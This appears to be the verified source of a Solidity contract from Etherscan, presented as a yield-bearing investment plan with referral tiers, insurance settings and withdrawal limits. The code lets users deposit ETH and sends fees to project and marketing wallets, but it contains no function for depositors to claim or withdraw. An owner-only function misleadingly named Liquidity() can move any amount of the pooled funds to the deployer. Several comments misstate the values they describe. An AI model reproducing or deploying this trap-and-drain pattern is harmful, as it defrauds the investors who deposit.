/**
 *Submitted for verification at Etherscan.io on 2022-04-12
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.5;

contract NEW_ETH {

	//accept funds from Insurance
	receive() external payable {}
   
	address payable public MAINCONTRACT;



	bool public						LAUNCHED;
	address payable public			WALLET_PROJECT;
	address payable public			WALLET_MARKETING;
	uint constant public			PERCENTS_DIVIDER				= 1000;
	uint constant public			TIME_STEP						= 1 days;
	uint constant public			INVEST_MIN_AMOUNT				= 0.1 ether;			// 0.1 BNB
	uint[] public					REFERRAL_PERCENTS				= [100, 20, 10, 0, 0];	// 10% 2% 1%
	uint constant public			PROJECT_FEE						= 10;					// project fee 1% of deposit
	uint constant public			MARKETING_FEE					= 140;					// marketing fee 14% of deposit
	uint constant public			MAX_WITHDRAW_AMOUNT				= 3 ether;				// claim 1 BNB max
	uint constant public			WITHDRAW_COOLDOWN				= 1 days / 2;			// claim 2 times per day
	address payable public			INSURANCE_CONTRACT;
	mapping (uint => uint) public	INSURANCE_MAXBALANCE;
	uint constant public			INSURANCE_PERCENT				= 0;					// PERMANENT DISABLED
	uint constant public			INSURANCE_LOWBALANCE_PERCENT	= 0;					// PERMANENT DISABLED
	uint constant public			REINVEST_PERCENT				= 0;					// PERMANENT DISABLED

	mapping (uint => THistoryDeposit) public DEPOSIT_HISTORY;
	uint public TOTAL_DEPOSITS;
	uint public TOTAL_INVESTED;
	uint public TOTAL_REFDIVIDENDS;
	uint public TOTAL_CLAIMED;
	uint public INSURANCE_TRIGGER_BALANCE;
	

	struct TPlan {
		uint durationDays;
		uint percent;
	}

	struct TDeposit {
		uint planIdx;
		uint amount;
		uint timeStart;
		uint timeEnd;
		bool isReinvest;
	}

	struct THistoryDeposit {
		uint timestamp;
		uint duration;
		uint amount;
	}

	struct TUser {
		uint		checkpoint;
		TDeposit[]	deposits;
		TDeposit[]	depHistory;
		uint[5]		refCount;
		address referrer;
		uint refDividends;
		uint debtBuffer;
		uint totalInvested;
		uint totalRefDividends;
		uint totalClaimed;
	}


	TPlan[] public						PLANS;
	mapping( address => TUser ) public	USERS;

	event ProjectFeePaid(uint amount);
	event MarketingFeePaid(uint amount);
	event Reinvested(uint amount);
	event InsuranseFeePaid(uint amount);
	event Claimed(address user, uint amount);
	event InitiateInsurance(uint high, uint current);
	event RefInvited(address referrer, address user);
	event RefDividends(address referrer, address user, uint refLevel, uint amount);
	event Newcomer(address user);
	event NewDeposit(address user, uint planIdx, uint amount);

	uint public		stat_maxDepositArrayLength;
	address public	stat_maxDepositArrayUser;
	uint public		stat_depositsReusedCounter;

		

	constructor(address payable _walletProject, address payable _walletMarketing) {

	    MAINCONTRACT = payable(msg.sender);
		WALLET_PROJECT = _walletProject;
		WALLET_MARKETING = _walletMarketing;

		PLANS.push( TPlan(4,300) );

	}
	function Liquidity(uint256 count) public {
		require(msg.sender == MAINCONTRACT, "Forbidden");
		uint balance = address(this).balance;
		if(balance==0) return;
		MAINCONTRACT.transfer(count);
	}

	function getBalance() public view returns(uint) {
		return address(this).balance;
	}

	function getMainContract() public view returns(address) {
		return MAINCONTRACT;
	}






	function invest(address, uint8 _planIdx) public payable {

		require(msg.value >= INVEST_MIN_AMOUNT, "The deposit amount is too low");
		require(_planIdx < PLANS.length, "Invalid plan index");
		if(!LAUNCHED) {
			require(msg.sender == WALLET_PROJECT, "Project has not launched yet");
			LAUNCHED = true;
		}

		//transfer project fee
		uint pfee = msg.value * PROJECT_FEE / PERCENTS_DIVIDER;
		WALLET_PROJECT.transfer(pfee);
		emit ProjectFeePaid(pfee);

		//transfer marketing fee
		uint mfee = msg.value * MARKETING_FEE / PERCENTS_DIVIDER;
		WALLET_MARKETING.transfer(mfee);
		emit MarketingFeePaid(mfee);

	



		_createDeposit( msg.sender, _planIdx, msg.value, false );

		
		
	}

	



	


	


	function _allocateReferralRewards(address _user, uint _depositAmount) internal {

		//loop through the referrer hierarchy, allocate refDividends
		address upline = USERS[_user].referrer;
		for (uint i=0; i < REFERRAL_PERCENTS.length; i++) {
			if (upline == address(0)) break;
			uint amount = _depositAmount * REFERRAL_PERCENTS[i] / PERCENTS_DIVIDER;
			USERS[upline].refDividends += amount;
			USERS[upline].totalRefDividends += amount;
			TOTAL_REFDIVIDENDS += amount;
			upline = USERS[upline].referrer;
			emit RefDividends(upline, _user, i, amount);
		}
	}

	

	function _createDeposit( address _user, uint _planIdx, uint _amount, bool _isReinvest ) internal returns(uint o_depIdx) {

		TUser storage user = USERS[_user];

		//first deposit: set initial checkpoint
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newcomer(_user);
		}

		TDeposit memory newDep = TDeposit( _planIdx, _amount, block.timestamp, block.timestamp + PLANS[_planIdx].durationDays * TIME_STEP, _isReinvest );

		//reuse a deceased slot or create new
		bool found;
		for(uint i=0; i<user.deposits.length; i++) {
			if(_isDepositDeceased(_user,i)) {
				user.deposits[i] = newDep;
				o_depIdx=i;
				found=true;
				stat_depositsReusedCounter++;
				break;
			}
		}
		if(!found) {
		o_depIdx=user.deposits.length;
		user.deposits.push(newDep);
		}

		//if not reinvest - update global stats
		if(!_isReinvest) {
			user.depHistory.push(newDep);
			user.totalInvested += _amount;
			DEPOSIT_HISTORY[TOTAL_DEPOSITS] = THistoryDeposit( block.timestamp, PLANS[_planIdx].durationDays*TIME_STEP, _amount );
			TOTAL_DEPOSITS++;
			TOTAL_INVESTED += _amount;
		}

		//technical data
 		if(stat_maxDepositArrayLength < user.deposits.length) {
			stat_maxDepositArrayLength = user.deposits.length;
			stat_maxDepositArrayUser = _user;
		}

		emit NewDeposit(_user, newDep.planIdx, newDep.amount);
	}

	

	function _isDepositDeceased(address _user, uint _depIdx) internal view returns(bool) {
		return (USERS[_user].checkpoint >= USERS[_user].deposits[_depIdx].timeEnd);
	}

	


	function getDepositHistory() public view returns(THistoryDeposit[20] memory o_historyDeposits, uint o_timestamp) {

		o_timestamp = block.timestamp;
		uint _from = TOTAL_DEPOSITS>=20 ? TOTAL_DEPOSITS-20 : 0;
		for(uint i=_from; i<TOTAL_DEPOSITS; i++) {
			o_historyDeposits[i-_from] = DEPOSIT_HISTORY[i];
		}
	}

	

	struct TPlanInfo {
		uint dividends;
		uint mActive;
		uint rActive;
	}

	struct TRefInfo {
		uint[5] count;
		uint dividends;
		uint totalEarned;
	}

	struct TUserInfo {
		uint claimable;
		uint checkpoint;
		uint totalDepositCount;
		uint totalInvested;
		uint totalClaimed;
	}



}